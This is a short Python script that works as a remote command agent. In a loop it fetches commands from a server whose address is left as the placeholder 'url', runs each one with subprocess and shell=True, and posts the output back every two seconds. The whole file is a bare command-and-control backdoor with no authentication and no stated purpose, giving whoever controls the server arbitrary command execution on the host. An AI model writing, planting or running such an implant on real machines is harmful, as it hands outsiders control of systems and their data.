import subprocess
import requests
import time

def update_status(session_id, data):
    r = requests.post("url"+str(session_id), json = {"command_output":str(data)})
    print(r.json())

while True:
    r = requests.get("url")
    data = r.json()
    for session in data["sessions"]:
        try:
            output = subprocess.check_output(session["command"], shell=True, stderr=subprocess.STDOUT)
            out = output.decode()
            update_status(session["session_id"],out if out != "" else "Done")
        except subprocess.CalledProcessError as e:
            update_status(session["session_id"],e.output.decode())
    time.sleep(2)
